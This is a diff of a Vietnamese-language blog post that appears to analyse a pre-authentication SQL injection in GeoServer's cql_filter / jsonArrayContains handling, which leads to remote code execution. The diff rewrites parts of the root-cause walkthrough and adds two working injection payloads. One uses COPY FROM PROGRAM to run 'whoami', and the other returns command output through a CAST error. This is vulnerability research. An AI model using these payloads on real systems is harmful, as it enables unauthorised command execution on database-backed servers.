@@ -31,7 +31,7 @@
                             "url": "https:\/\/g03m0n.github.io\/images\/Apple-Devices-Preview.png",
                             "width":  3200 ,
                             "height":  2048 
-                        }],"genre": "posts","keywords": "cve, Geoserver","wordcount":  933 ,
+                        }],"genre": "posts","keywords": "cve, Geoserver","wordcount":  861 ,
         "url": "https:\/\/g03m0n.github.io\/posts\/geoserver-preauth-sqli\/","datePublished": "2026-08-16T08:29:01+08:00","dateModified": "2026-08-16T08:29:01+08:00","publisher": {
             "@type": "Organization",
             "name": "xxxx","logo": "https:\/\/g03m0n.github.io\/images\/avatar.png"},"author": {
@@ -121,7 +121,7 @@
         </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Geoserver - Pre-Auth SQLi lead to RCE</h1><div class="post-meta">
             <div class="post-meta-line"><span class="post-author"><a href="https://github.com/g03m0n" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>g03m0n</a>
 </span>&nbsp;<span class="post-category">included in <a href="/categories/cves/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>CVEs</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2026-08-16">2026-08-16</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;933 words&nbsp;
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2026-08-16">2026-08-16</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;861 words&nbsp;
                 <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;5 minutes&nbsp;</div>
         </div><div class="details toc" id="toc-static"  data-kept="">
                 <div class="details-summary toc-title">
@@ -174,7 +174,7 @@
 </span></span></code></pre></div><hr>
 <h2 id="root-cause-analysis">Root cause analysis</h2>
 <h3 id="source">Source</h3>
-<p>Mọi truy cập từ bên ngoài vào hệ thống đều phải đi qua file cấu hình <code>web.xml</code> của Servlet Container. Tại đây, GeoServer cấu hình một <code>DispatcherServlet</code> của Spring Framework để hứng toàn bộ các luồng truy cập có đường dẫn <code>/*</code>.</p>
+<p>Toàn bộ request tới GeoServer đi qua một DispatcherServlet duy nhất của Spring, được khai báo trong <code>src\web\app\src\main\webapp\WEB-INF\web.xml</code> để nhận mọi path <code>/*</code>:</p>
 <p><code>src\web\app\src\main\webapp\WEB-INF\web.xml</code></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span>    <span style="color:#75715e">&lt;!-- spring dispatcher servlet, dispatches all incoming requests --&gt;</span>
 </span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;servlet&gt;</span>
@@ -189,26 +189,19 @@
 </span></span></code></pre></div><p>Sau khi <code>DispatcherServlet</code> nhận được Request, nó phân tích đường dẫn và nhận ra đây là một truy vấn dành cho dịch vụ WFS/WCS. Hệ thống OWS của GeoServer lấy các tham số (Key-Value) trên URL ra. Khi thấy tham số <code>cql_filter</code>, nó tra cứu trong hệ thống Spring Bean và tìm thấy <code>CQLFilterKvpParser</code> – lớp được giao nhiệm vụ xử lý tham số này.</p>
 <p><code>src\wfs\src\main\java\applicationContext.xml</code></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span>    <span style="color:#f92672">&lt;bean</span> <span style="color:#a6e22e">id=</span><span style="color:#e6db74">&#34;cqlKvpParser&#34;</span> <span style="color:#a6e22e">class=</span><span style="color:#e6db74">&#34;org.geoserver.ows.kvp.CQLFilterKvpParser&#34;</span><span style="color:#f92672">/&gt;</span>
-</span></span></code></pre></div><p>Tại đây, payload từ URL được truyền thẳng vào hàm <code>parse()</code> dưới dạng raw string mà không hề có bất kỳ cơ chế lọc (Sanitization) hay chặn ký tự đặc biệt nào.</p>
+</span></span></code></pre></div><p>Bean này chỉ làm đúng một việc — chuyển raw string sang engine ECQL, không hề sanitize:</p>
 <p><code>org.geoserver.ows.kvp.CQLFilterKvpParser</code></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> Object <span style="color:#a6e22e">parse</span>(String value) <span style="color:#66d9ef">throws</span> Exception {
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> XCQL.<span style="color:#a6e22e">toFilterList</span>(value); 
 </span></span><span style="display:flex;"><span>    }
-</span></span></code></pre></div><p>Raw string tiếp tục đi vào thư viện GeoTools thông qua một chuỗi các lệnh gọi hàm:</p>
-<ol>
-<li><code>XCQL.toFilterList(value)</code> (Chọn ngôn ngữ truy vấn là ECQL)</li>
-<li><code>ECQL.toFilterList(value)</code> (Khởi tạo bộ biên dịch)</li>
-<li><code>CompilerUtil.parseFilterList()</code></li>
-<li><code>ECQLCompiler.compileFilterList()</code> (Bắt đầu chạy trình phân tích cú pháp JavaCC)</li>
-</ol>
-<p>Ở bước này, parser chỉ tuân theo ngữ pháp của ngôn ngữ CQL. Khi bộ quét đọc đến tham số thứ 3 của hàm <code>jsonArrayContains</code>, nó thấy đoạn payload nằm trong dấu nháy đơn <code>'x'') OR 1=1 -- '</code>. Ngay lập tức, một callback được kích hoạt để bọc đoạn chuỗi này thành một đối tượng Java có tên là <code>Literal</code>. Đáng chú ý, tại đây <strong>khái niệm SQL Injection chưa tồn tại</strong> nên nó không hề escape mã độc cho cơ sở dữ liệu.</p>
+</span></span></code></pre></div><p>Từ đây payload đi qua chuỗi gọi <code>XCQL.toFilterList</code> → <code>ECQL.toFilterList</code> → <code>CompilerUtil.parseFilterList</code> → <code>ECQLCompiler.compileFilterList</code>, tức là được đưa thẳng vào parser <code>JavaCC</code> của ngôn ngữ CQL — một lớp hoàn toàn không biết khái niệm SQL injection. Khi parser gặp giá trị nằm trong dấu nháy đơn (tham số thứ 3 của jsonArrayContains), nó chỉ đơn giản bóc dấu <code>'...'</code> bên ngoài rồi gói phần còn lại giữ nguyên payload thành object Literal:</p>
 <p><code>org.geotools.filter.text.cql2.AbstractFilterBuilder</code></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> Literal <span style="color:#a6e22e">buildLiteralString</span>(<span style="color:#66d9ef">final</span> String tokenImage) {
 </span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Chỉ xóa &#39; &#39; bọc ngoài, giữ nguyên payload</span>
 </span></span><span style="display:flex;"><span>        String strLiteral <span style="color:#f92672">=</span> removeQuotes(tokenImage);
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> filterFactory.<span style="color:#a6e22e">literal</span>(strLiteral);
 </span></span><span style="display:flex;"><span>    }
-</span></span></code></pre></div><p>Khi GeoServer muốn truy xuất dữ liệu từ cơ sở dữ liệu, nó đưa cây Filter vừa dựng cho tầng <strong>DataStore Dialect</strong> xử lý. Nếu Backend là PostgreSQL, lớp <code>PostgisFilterToSQL</code> sẽ tiếp nhận. Lớp này làm nhiệm vụ dịch các hàm logic như <code>jsonArrayContains</code> sang cú pháp SQL chuẩn của PostGIS.</p>
+</span></span></code></pre></div><p>Kết quả là một cây Filter chứa Literal kèm payload gốc, chưa qua bất kỳ bước lọc nào — được truyền tiếp cho tầng DataStore Dialect để dịch sang SQL. Với backend PostgreSQL, lớp đảm nhận là <code>PostgisFilterToSQL</code>, chuyên dịch các hàm như <code>jsonArrayContains</code> sang cú pháp PostGIS:</p>
 <p><code>org.geotools.data.postgis.PostgisFilterToSQL</code></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> Object <span style="color:#a6e22e">visit</span>(PropertyIsEqualTo filter, Object extraData) {
 </span></span><span style="display:flex;"><span>        Expression left <span style="color:#f92672">=</span> filter.<span style="color:#a6e22e">getExpression1</span>(); <span style="color:#75715e">// left là hàm JsonArrayContains</span>
@@ -220,14 +213,8 @@
 </span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> extraData;
 </span></span><span style="display:flex;"><span>        }
 </span></span><span style="display:flex;"><span>    }
-</span></span></code></pre></div><p>Từ điểm này, một chuỗi các hàm nội bộ của GeoTools được gọi liên tiếp để điều hướng đối tượng <code>left</code> (tức hàm <code>jsonArrayContains</code>) xuống nơi xử lý cuối cùng:</p>
-<ol>
-<li>Gọi <code>writeBinaryExpression(...)</code></li>
-<li>Gọi <code>left.accept(this.delegate)</code> để dispatch (phân luồng) hàm.</li>
-<li>Rơi vào <code>visit(Function, ...)</code> (Bộ điều phối chung cho tất cả các loại hàm).</li>
-<li>Chuyển sang <code>visitFunction(Function, ...)</code> trong <code>FilterToSqlHelper</code>.</li>
-<li>Tại đây, hệ thống nhận diện <code>function instanceof JsonArrayContainsFunction</code>, nên gọi tiếp <code>encodeJsonArrayContains(Function)</code>.</li>
-</ol>
+</span></span></code></pre></div><p><code>left</code> (chứa Literal payload) sau đó đi qua một chuỗi dispatch nội bộ của GeoTools để tới nơi xử lý cuối cùng:</p>
+<p><code>writeBinaryExpression()</code> → <code>left.accept(delegate)</code> → <code>visit(Function, ...)</code> (bộ điều phối chung cho mọi hàm) → <code>visitFunction()</code> trong <code>FilterToSqlHelper</code> → nhận diện <code>instanceof JsonArrayContainsFunction</code> → gọi <code>encodeJsonArrayContains()</code>.</p>
 <h3 id="sink">Sink</h3>
 <p>Ứng dụng kiểm tra version của Postgre xem có hỗ trợ hàm <code>json_path_exists(</code> không (version ≥ 12), nếu có thì sử dụng hàm nếu không rẽ sang toán tử containment <code>@&gt;</code>, không đi qua <code>constructEquality()</code>.</p>
 <p><code>\gt-jdbc-postgis-34.1.jar\org.geotools.data.postgis\FilterToSqlHelper.java</code></p>
@@ -323,7 +310,8 @@
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">Host</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">localhost</span><span style="color:#f92672">:</span><span style="color:#ae81ff">8080</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">User</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Agent</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">poc</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">Connection</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">keep</span><span style="color:#f92672">-</span><span style="color:#a6e22e">alive</span>
-</span></span></code></pre></div><p><img
+</span></span></code></pre></div><p><code>jsonArrayContains(&quot;data&quot;, '/a', 'x&quot;)'') AND CAST((SELECT chr(126)||(SELECT encode(convert_to(COALESCE(string_agg(output, chr(10)), ''[Empty Output]''), ''UTF8''), ''hex'') FROM cmd_out_tmp)||chr(126)) AS NUMERIC)=1 OR (''1''=''1') = true</code></p>
+<p><img
         class="lazyload"
         src="/svg/loading.min.svg"
         data-src="/images/geoserver_preauth_sqli_7.png"
@@ -337,7 +325,8 @@
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">Host</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">localhost</span><span style="color:#f92672">:</span><span style="color:#ae81ff">8080</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">User</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Agent</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">poc</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">Connection</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">keep</span><span style="color:#f92672">-</span><span style="color:#a6e22e">alive</span>
-</span></span></code></pre></div><p><img
+</span></span></code></pre></div><p><code>jsonArrayContains(&quot;data&quot;, '/a', 'x&quot;)'') ) ; COMMIT; DROP TABLE IF EXISTS cmd_out_tmp; CREATE TABLE cmd_out_tmp(output text); COPY cmd_out_tmp(output) FROM PROGRAM ''whoami''; COMMIT; --') = true</code></p>
+<p><img
         class="lazyload"
         src="/svg/loading.min.svg"
         data-src="/images/geoserver_preauth_sqli_8.png"
